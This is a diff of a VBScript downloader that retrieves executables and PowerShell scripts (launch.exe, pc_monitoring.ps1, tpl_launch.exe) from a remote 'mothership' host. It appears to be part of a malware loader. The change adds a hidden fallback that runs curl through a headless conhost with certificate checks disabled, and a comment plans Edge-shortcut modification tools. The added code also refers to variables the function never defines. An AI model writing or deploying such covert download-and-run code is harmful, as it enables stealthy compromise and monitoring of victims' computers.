@@ -240,7 +240,6 @@ Function HeadersToDict(responsetext)
 
 End Function
 
-' TODO
 Function RetrieveAsset(fname, localfpath)
     
     Dim headersout
@@ -248,9 +247,18 @@ Function RetrieveAsset(fname, localfpath)
     
     RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headersout)
     
-    ' check if success, if fail use curl
-    ' Call RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq, True)
-
+    If not fso.FileExists(localfpath) Then
+        Dim cmdstr
+        cmdstr = "conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq 
+        
+        If not XIsEmpty(bunnyheader) Then        
+            cmdstr = cmdstr & " -H " & dq & bunnyheader & dq 
+        End If
+        
+        RetrieveAsset = RunShell(cmdstr, True)
+        ' anchor
+    End If
+    
 End Function
 
 Function DownloadFile(sURL, headersin, sFile)
@@ -276,7 +284,9 @@ End Function
 Function DownloadFileWithHeaders(sURL, sFile, headersin, headers)
     Dim pp : pp = "DownloadFileWithHeaders"
     DownloadFileWithHeaders = False
+    
     On Error Resume Next
+    
     Err.Clear
     
     If XIsEmpty(sURL) or XIsEmpty(sFile) Then
@@ -347,7 +357,15 @@ Function DownloadFileWithHeaders(sURL, sFile, headersin, headers)
 	
 	DownloadFileWithHeaders = true
     
+
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End If
+    
     Call LogMsg(pp & " finished")
+
 End Function
 
 Function URLEncode(str)
@@ -1464,7 +1482,7 @@ Function GetBunnyHeaderDict()
 
 End Function
 
-' TODO
+' TODO: add assets to list
 Function Retrieve()
     Dim pp : pp = "Retrieve"
     
@@ -1474,7 +1492,7 @@ Function Retrieve()
     
     Dim files 
     
-    ' pcmon, relay
+    ' pcmon, relay, modify_edge_lnk.ps1, gunite, 7za, nircmdc
     files = Array("launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
         
     Dim file
@@ -1489,7 +1507,12 @@ Function Retrieve()
 
     Next
     
-    Call LogMsg("Retrieve finished")
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+    End If
+    
+    Call LogMsg(pp & " -- finished")
 
 End Function
 
